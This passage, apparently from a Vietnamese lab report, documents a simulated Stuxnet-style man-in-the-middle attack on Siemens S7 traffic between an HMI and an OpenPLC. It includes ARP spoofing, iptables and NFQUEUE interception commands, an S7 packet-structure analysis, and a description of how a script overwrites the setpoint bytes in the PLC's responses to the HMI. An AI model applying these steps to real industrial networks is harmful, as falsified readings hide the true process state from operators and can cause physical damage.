+\end{figure}
+
+Kiểm tra debugger của OpenPLC Editor cũng cho thấy thực tế máy đang chạy giao động quanh mốc 2000
+
+
+\subsubsection{Phân tích tấn công}
+
+
+Phần khó nhất của cuộc tấn công này là làm sao sửa đổi gói tin rồi chuyển tiếp lại được. Để đảm bảo tốc độ, ở đây sử dụng phương pháp ARP Spoofing bằng Bettercap để redirect gói tin đến máy Attacker, tại đây, gói tin sẽ được đẩy vào NFQUEUE để Python app gọi lên xử lý thay vì để OS Kernel tự động forward gói tin đi. 
+
+
+\textit{Một phần vì Bettercap chỉ cung cấp khả năng chỉnh sửa gói tin khi intercept bằng Javascript mà ngôn ngữ này lại không phù hợp để viết bộ S7 Parser nên mới phải làm cách này}
+
+
+\begin{verbatim}
+# 1. Bật IP Forwarding
+subprocess.run("sysctl -w net.ipv4.ip_forward=1 > /dev/null", shell=True)
+
+# 2. Tắt RP Filter (Tránh rớt gói tin chiều về từ Router)
+# Tránh kernel tự động drop gói tin lạ -> Cho phép gói tin từ PLC về được phép qua
+subprocess.run("sysctl -w net.ipv4.conf.all.rp_filter=0 > /dev/null", shell=True)
+subprocess.run("sysctl -w net.ipv4.conf.default.rp_filter=0 > /dev/null", shell=True)
+subprocess.run(f"sysctl -w net.ipv4.conf.{INTERFACE}.rp_filter=0 > /dev/null", shell=True)
+
+# 3. Thêm Route tới dải PLC thông qua Gateway thật
+# Không có dòng này sẽ gây lỗi mất kết nối ngay lập tức trên HMI khi nó gửi yêu
+# cầu read var tới PLC
+print(f"[*] Thêm tuyến đường tới {PLC_NET} qua {GATEWAY}...")
+subprocess.run(f"route add -net {PLC_NET} gw {GATEWAY} 2>/dev/null", shell=True)
+
+# 4. Cấu hình Iptables
+print("[*] Đang thiết lập Iptables NFQUEUE...")
+subprocess.run("iptables -F", shell=True)               # Xóa sạch filter table
+subprocess.run("iptables -t mangle -F", shell=True)      # Xóa sạch mangle table
+subprocess.run("iptables -P FORWARD ACCEPT", shell=True) # Đảm bảo forward không bị chặn
+
+# Bẫy traffic S7 (Port 102) vào Queue
+# Để thay vì Kernel tự động drop gói tin, python app sẽ xử lý gói tin và chuyển tiếp lại
+subprocess.run(f"iptables -t mangle -A FORWARD -p tcp --dport 102 -j NFQUEUE --queue-num {QUEUE_NUM}", shell=True)
+subprocess.run(f"iptables -t mangle -A FORWARD -p tcp --sport 102 -j NFQUEUE --queue-num {QUEUE_NUM}", shell=True)
+
+# Chặn gói RST tự phát từ Kernel (Tránh Disconnected)
+# Kernel sẽ tự gửi RST (reset connection) nếu nhận gói từ port nó không biết
+subprocess.run("iptables -I OUTPUT -p tcp --tcp-flags RST RST -j DROP", shell=True)
+\end{verbatim}
+
+
+Sau khi đã có được gói tin cần tiến hành chỉnh sửa. Cấu trúc của gói tin S7 như sau:
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/Siemens_S7_protocol_stack.png}
+    \caption{alt text}
+    \label{fig:iemensS7protocolstackpng}
+\end{figure}
+
+
+Với:
+
+
+\begin{itemize}
+    \item \texttt{TPKT Header}: Cố định là 4 byte như đã trình bày trong phần lý thuyết về giao thức S7.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-19.png}
+    \caption{alt text}
+\end{figure}
+
+    \item \texttt{COTP Header}: Cố định là 3 byte như đã trình bày trong phần lý thuyết về giao thức S7.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-20.png}
+    \caption{alt text}
+\end{figure}
+
+    \item \texttt{S7 Header}: Byte đầu tiên luôn là \texttt{0x32}, ta dùng byte này để phân biệt gói tin S7comm và các gói tin khác. Ngoài ra trong đây có một trường mà ta cần quan tâm đó chính là \texttt{ROSCTR} - \texttt{ROS Control}, đây là trường quyết định loại lệnh S7comm mà PLC gửi đi. Cụ thể:
+    \begin{itemize}
+        \item \texttt{0x01}: Job
+        \item \texttt{0x02}: Ack
+        \item \texttt{0x03}: Ack\_Data
+    \end{itemize}
+\end{itemize}
+
+
+    Như trong trường hợp này, quan sát thấy gói tin Read Var Request sẽ có \texttt{ROSCTR} là \texttt{Job}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-25.png}
+    \caption{alt text}
+    \label{fig:stuxnetmitmsimimage25png}
+\end{figure}
+
+
+    còn gói tin Read Var Response sẽ có \texttt{ROSCTR} là \texttt{Ack\_Data}.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-26.png}
+    \caption{alt text}
+    \label{fig:stuxnetmitmsimimage26png}
+\end{figure}
+
+
+    Mấy trường còn lại trong Header không quan trọng cho dự án này.
+
+
+\begin{itemize}
+    \item Phần \texttt{Param} và \texttt{Data} sẽ tuỳ thuộc vào loại lệnh S7comm đang được sử dụng, ví dụ như Setup Communication, Read Var, Write Var, ...
+\end{itemize}
+
+
+Ở đây chỉ xét tới phần \texttt{Param} và \texttt{Data} của loại lệnh \textbf{Read Var} [[2]]. Đầu tiên là về cách định vị các Var muốn đọc. S7 có 3 cách để định vị các Var:
+
+
+\begin{itemize}
+    \item \textbf{Any-type}: Chỉ rõ \texttt{area} (ví dụ: \texttt{DB}, \texttt{M}, \texttt{I}, \texttt{Q}), \texttt{address} (tức byte nào), kiểu dữ liệu. Ví dụ đọc biến \texttt{DB1.DBX0.0} sẽ có \texttt{area = DB}, \texttt{address = 1} (tức byte thứ 1), kiểu dữ liệu là bit Khi này, cấu trúc của phần \texttt{Param} sẽ là:
+\end{itemize}
+
+
+    Với Read Var \textbf{Request}:
+
+
+\begin{verbatim}
+![alt text](AnyTypeStruct.svg)
+\end{verbatim}
+
+
+\begin{itemize}
+    \item \texttt{Function Code}: \texttt{0x04} vì đây là lệnh Read Var (Các kiểu định vị khác như DB-Type, Symbolic cũng giống trường này vì chúng đều thuộc nhóm command đọc ghi biến (\texttt{0x04}/\texttt{0x05}).)
+    \item \texttt{Item count}: Số lượng Items có sẽ được chỉ định trong gói tin này (Các kiểu định vị khác như DB-Type, Symbolic cũng giống trường này). Như trong hình là có 2 items.
+\end{itemize}
+
+
+\begin{itemize}
+    \item Các kiểu định vị chỉ khác nhau ở phần cấu trúc của \texttt{Request Item}:
+    \item \texttt{Spec Type}: Luôn là \texttt{0x12}
+    \item \texttt{Length}: Độ dài của Item này
+    \item \texttt{Syntax ID}: \texttt{0x10} cho kiểu Any-type, \texttt{0xb0} cho kiểu DB-Type
+\end{itemize}
+
+
+            Ảnh chụp lưu lượng từ Wireshark cho thấy hai bên trong dự án giao tiếp với nhau bằng kiểu Any-type \texttt{0x10}:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-22.png}
+    \caption{alt text}
+    \label{fig:stuxnetmitmsimimage22png}
+\end{figure}
+
+
+\begin{itemize}
+    \item \texttt{Variable Type}: xác định kiểu dữ liệu và độ dài của biến (thường sử dụng các kiểu dữ liệu S7 như REAL, BIT, BYTE, WORD, DWORD, COUNTER, …).
+    \item \texttt{Count}: có thể chọn toàn bộ một mảng các biến có cùng kiểu bằng cách sử dụng một struct item duy nhất. Các biến này phải cùng kiểu, và phải liên tiếp trong bộ nhớ và trường \texttt{Count} xác định kích thước của mảng này. Được đặt là 1 cho việc đọc hoặc ghi một biến duy nhất.
+    \item Các trường còn lại xách định địa chỉ muốn đọc, viết theo đúng cấu trúc của Any-type với \texttt{DB Number} (chỉ có khi \texttt{area} là DB) cho datablock muốn đọc, \texttt{Area} cho loại vùng nhớ muốn đọc (DB, M, I, Q), \texttt{Address} cho địa chỉ cụ thể muốn đọc trong vùng nhớ đó. Trường \texttt{Address} 3 byte này encode bit offset theo dạng big-endian.
+\end{itemize}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-21.png}
+    \caption{alt text}
+    \label{fig:stuxnetmitmsimimage21png}
+\end{figure}
+
+
+    Với Read Var \textbf{Response} tương tự, chỉ thay thế phần \texttt{Request Item} thành \texttt{Data Item}:
+
+
+\begin{verbatim}
+![alt text](ReadVarResponse.svg)
+\end{verbatim}
+
+
+\begin{itemize}
+    \item \texttt{Error Code}: \texttt{0xff} cho success
+    \item \texttt{Variable Type} và \texttt{Count} giống như Request Item
+    \item \texttt{Data}: Trả về dữ liệu cho các Items tương ứng được hỏi trong Request Item.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-23.png}
+    \caption{alt text}
+\end{figure}
+
+\end{itemize}
+
+
+
+\begin{itemize}
+    \item \textbf{DB-Type}: dành riêng cho area DB, ngắn gọn hơn cách trên. Tạm không phân tích vì trong dự án này không sử dụng. Cấu trúc của Request Item và Response Item như sau:
+\end{itemize}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-24.png}
+    \caption{alt text}
+    \label{fig:stuxnetmitmsimimage24png}
+\end{figure}
+
+
+\begin{itemize}
+    \item \textbf{Symbolic}: Thay vì dùng địa chỉ byte, ta có thể dùng tên biến đã được định nghĩa trong chương trình PLC. Ví dụ: \texttt{DB1.CustomProperty1}. Khi này tham số sẽ bao gồm tên biến và kiểu dữ liệu. Cách này chỉ hỗ trợ trên các dòng S7-1200/1500. Tạm không phân tích vì trong dự án này không sử dụng.
+\end{itemize}
+
+
+Lý do cần phân tích cấu trúc gói tin là vì đã thử tìm trên mạng nhưng không có bộ Parser nào cho S7, chỉ duy nhất có một bộ Parser bằng C tại  https://github.com/ricardojoserf/s7-parser. Tuy nhiên nó có một vấn đề là không thể parse được phần \texttt{Data} trong \texttt{Response Item} của gói tin S7, nên dự án đã dựa vào đó để viết lại bộ parser bằng Python và cải tiến thêm để có thể parse được phần \texttt{Data} này. Script tại đây (\url{./attacker/mitm/s7_parser.py}).
+
+
+Thử nghiệm bộ parser bằng cách chạy trên một file PCAP, chỉ định gói tin cần extract (ở đây là gói tin thứ 9):
+
+\begin{verbatim}
+uv run .\s7_parser.py .\wincc_s300_setup-alarm-read-write.pcapng 9
+\end{verbatim}
+
+
+Output:
+
+
+\begin{verbatim}
+Analyzing S7 packet #9:
+
+================================================================================
+S7 Protocol Packet Detected
+================================================================================
+
+S7 Communication
+  Header: (Ack_Data)
+    Protocol Id: 0x32
+    ROSCTR: Ack_Data (3)
+    Redundancy Identification (Reserved): 0x0000
+    Protocol Data Unit Reference: 2
+    Parameter length: 2
+    Data length: 52
+    Error class: No error (0x00)
+    Error code: 0x00
+  Parameter: (Read Var)
+    Function: Read Var (0x04)
+    Item count: 8
+  Data
+    Item [1]: (Success)
+      Return code: Success (0xff)
+      Transport size: BIT (0x03)
+      Length: 1
+      Data: 01
+    Item [2]: (Success)
+      Return code: Success (0xff)
+      Transport size: REAL (0x07)
+      Length: 4
+      Data: aabbccdd
+    Item [3]: (Success)
+      Return code: Success (0xff)
+      Transport size: BYTE/WORD/DWORD (0x04)
+      Length: 4
+      Data: feadbeef
+    Item [4]: (Success)
+      Return code: Success (0xff)
+      Transport size: BYTE/WORD/DWORD (0x04)
+      Length: 2
+      Data: babe
+    Item [5]: (Success)
+      Return code: Success (0xff)
+      Transport size: BIT (0x03)
+      Length: 1
+      Data: 01
+    Item [6]: (Success)
+      Return code: Success (0xff)
+      Transport size: BIT (0x03)
+      Length: 1
+      Data: 01
+    Item [7]: (Success)
+      Return code: Success (0xff)
+      Transport size: OCTET STRING (0x09)
+      Length: 2
+      Data: 2504
+    Item [8]: (Success)
+      Return code: Success (0xff)
+      Transport size: OCTET STRING (0x09)
+      Length: 2
+      Data: 0011
+
+================================================================================
+
+\end{verbatim}
+
+
+Giống với cách gói tin được Parse trong Wireshark:
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-16.png}
+    \caption{alt text}
+    \label{fig:stuxnetmitmsimimage16png}
+\end{figure}
+
+
+
+Bây giờ việc của \texttt{s7\_intercept.py} (\url{./attacker/mitm/s7_intercept.py}) là:
+
+\begin{enumerate}
+    \item Lấy các gói tin S7 lên từ NFQUEUE, mỗi gói tin gọi hàm \texttt{process\_packet} để xử lý.
+
+    \item Hàm \texttt{process\_packet} sẽ kiểm tra đây có phải là gói tin S7 comm không bằng cách kiểm tra tuần tự:
+    \begin{itemize}
+        \item Byte TPKT: \texttt{payload[0] == 0x03};
+        \item COTP: \texttt{payload[4] == 0x02};
+        \item S7 Header: \texttt{payload[7] == 0x32};
+        \item ROSCTR: \texttt{payload[8] == 0x03} (tức gói tin Response từ PLC gửi về HMI).
+    \end{itemize}
+
+    \item Nếu là gói tin S7 comm và là gói tin Response từ PLC gửi về HMI, thì tại đây sẽ có 2 trường hợp (ứng với 2 cặp request-response đã đề cập ở đầu):
+    \begin{itemize}
+        \item Gói tin trả lời cho lệnh đọc 1 bit \texttt{bCentrifugeStatus} tại \texttt{DB2.DBX0.0};
+        \item Gói tin trả lời cho lệnh 4 byte đọc \texttt{iSetpoint} và \texttt{iSimSpeed} tại \texttt{DB1.DBW2}.
+    \end{itemize}
+
+    Ta lọc để chỉ can thiệp vào gói tin Response trả về \texttt{iSetpoint} và \texttt{iSimSpeed}.
+    Gói tin này có độ dài 29 Byte, dài hơn gói tin Response trả về \texttt{bCentrifugeStatus}.
+    Và vì theo cấu trúc datablock DB1, ta biết biến \texttt{iSetpoint} nằm sau \texttt{iSimSpeed} nên vị trí của nó sẽ là tại offset 27, 28.
+    Chỉ cần ghi đè giá trị mới vào 2 byte này là xong.
+
+    \item Xoá checksum để scapy tự tính lại.
+
+    \item Đẩy gói tin trở lại NFQUEUE để tiếp tục được chuyển đi.
+\end{enumerate}
+
+
+Lưu ý trên HMI Fuxa khi cấu hình tham số Pooling:
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-27.png}
+    \caption{alt text}
+    \label{fig:stuxnetmitmsimimage27png}
+\end{figure}
+
+
+Tốc độ chỉnh sửa gói tin và gửi lại cần phải nhanh hơn tần số polling này để tránh có hiện tượng có gói tin bị mất.
+
+% Kết thúc nhánh subsubsection của Stuxnet; các kịch bản dưới đây là \subsection riêng (cùng cấp Reconnaissance, Stuxnet).
+\setcounter{subsubsection}{0}
+
+\subsection{Tấn công DoS trên PLC}
+\label{sec:dos_plc}
+
+Pending\dots
+
+\subsection{Gửi gói tin malformed tới PLC}
+\label{sec:malformed_plc}
+
+Pending\dots
 
 \end{document}
